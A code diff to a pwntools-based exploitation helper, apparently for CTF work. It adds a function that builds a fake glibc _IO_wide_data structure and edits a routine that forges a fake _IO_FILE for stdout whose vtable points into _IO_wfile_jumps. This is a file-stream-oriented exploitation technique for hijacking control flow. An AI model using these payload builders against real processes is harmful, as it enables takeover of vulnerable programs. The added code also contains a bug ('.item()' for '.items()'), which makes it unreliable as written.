@@ -1,6 +1,18 @@
-from pwn import ELF
-from pwn import p8, p16, p32, p64
+from pwnlib.elf import ELF
+from pwnlib.util.packing import p8, p16, p32, p64
+from ..util import err
 
+def wide_data(addr: int, overlay: bytes = b"", vtable: int | None = None):
+    fields = {
+        0xe0: ("_IO_wide_vtable", 8, vtable or addr),
+    }
+    size = max(offset + size for offset, (_, size, _) in fields.item())
+    data = bytearray(overlay.ljust(size, b"\0"))
+    for offset, (name, size, value) in fields.items():
+        if data[offset:offset+size] != b"\0" * size:
+            err.warn(f"{name} at offset {offset:#x} is non zero")
+        data[offset:offset+size] = value.to_bytes(size, "little")
+    return data
 
 def inline_stdout(libc: ELF):
     wide_data = libc.sym._IO_2_1_stdout_
@@ -33,7 +45,8 @@ def inline_stdout(libc: ELF):
     fake += p64(0)  # _codecvt
     fake += p64(wide_data)  # _wide_data
     fake += p64(0)  # _freeres_list
-    fake += p64(0)  # _prevchain
+    fake += p64(0)  # _freeres_buf
+    fake += p64(0) # __pad5
     fake += p32(0)  # _mode
     fake += b"\x00" * 20  # _unused2
     fake += p64(libc.sym._IO_wfile_jumps - 0x20)  # vtable
